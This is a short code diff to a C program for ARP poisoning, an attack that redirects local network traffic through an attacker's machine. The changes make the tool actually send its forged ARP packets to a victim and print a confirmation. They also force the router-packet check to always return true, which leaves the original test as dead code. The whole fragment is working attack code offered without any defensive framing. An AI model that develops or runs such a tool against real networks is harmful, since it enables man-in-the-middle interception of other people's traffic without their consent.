@@ -93,7 +93,9 @@ arp_poison (const struct pkt_arp * packet )
     // DEST ip addr, i.e. victim
     memcpy(bytes+offset,packet->proto_addr_send,IP_ADDR_SIZE);
     offset += ETH_ADDR_SIZE;
-
+    
+    send_packet(bytes,sizeof(const struct pkt_arp));
+    printf("ARP Poison Packet have been sent ! ");
     return ;
 }		/* -----  end of function arp_poison  ----- */
 
@@ -114,6 +116,7 @@ int is_from_victim(const struct pkt_arp * packet) {
  * for now =)
  * */
 int is_router_packet(const struct pkt_arp * packet) {
+	return 1;
     const struct in_addr * addr;
     addr = (const struct in_addr*)packet->proto_addr_dest;
     if (addr->s_addr  !=  routerip.s_addr)  {
